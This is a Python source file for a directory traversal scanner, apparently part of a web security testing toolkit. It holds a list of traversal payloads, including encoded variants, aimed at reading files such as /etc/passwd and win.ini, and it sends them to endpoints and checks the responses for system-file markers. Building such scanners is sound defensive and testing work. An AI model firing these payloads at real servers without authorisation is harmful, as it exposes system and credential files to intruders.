import requests
from typing import List, Dict
from utils.logger import Logger

logger = Logger.get_logger("DirectoryTraversalScanner")


class DirectoryTraversalScanner:
    """Test web servers for directory traversal vulnerabilities"""

    def __init__(self):
        self.payloads = [
            "../",
            "..\\",
            "....//",
            "....\\\\",
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "%2e%2e/",
            "..%252f",
            "..%c0%af",
            "/etc/passwd",
            "/windows/win.ini",
            "c:\\windows\\win.ini",
        ]
        self.timeout = 10

    def scan_endpoint(self, base_url: str, endpoint: str = "/", file_to_access: str = None) -> Dict:
        """Test endpoint for directory traversal vulnerabilities"""
        results = {"vulnerable": False, "payloads_found": [], "responses": []}
        
        if not base_url.startswith(("http://", "https://")):
            base_url = f"http://{base_url}"

        payloads_to_test = self.payloads
        if file_to_access:
            payloads_to_test = [f"{p}{file_to_access}" for p in self.payloads]

        for payload in payloads_to_test:
            try:
                url = f"{base_url}{endpoint}".rstrip("/") + "/" + payload
                response = requests.get(url, timeout=self.timeout, allow_redirects=False)
                
                if response.status_code in [200, 206]:
                    if self._check_sensitive_content(response.text):
                        results["vulnerable"] = True
                        results["payloads_found"].append(payload)
                        results["responses"].append({
                            "payload": payload,
                            "status": response.status_code,
                            "preview": response.text[:200]
                        })
                        logger.info(f"Traversal found: {payload}")
            except Exception as e:
                logger.debug(f"Traversal test failed for {payload}: {str(e)}")
        
        return results

    def _check_sensitive_content(self, content: str) -> bool:
        """Check if response contains sensitive file content"""
        sensitive_markers = [
            "root:",
            "[drivers]",
            "boot=",
            "microsoft",
            "windows",
            "passwd",
            "shadow",
            "etc",
        ]
        return any(marker.lower() in content.lower() for marker in sensitive_markers)

    def scan_multiple_endpoints(self, base_url: str, endpoints: List[str]) -> List[Dict]:
        """Scan multiple endpoints for traversal vulnerabilities"""
        results = []
        for endpoint in endpoints:
            result = self.scan_endpoint(base_url, endpoint)
            result["endpoint"] = endpoint
            results.append(result)
        return results
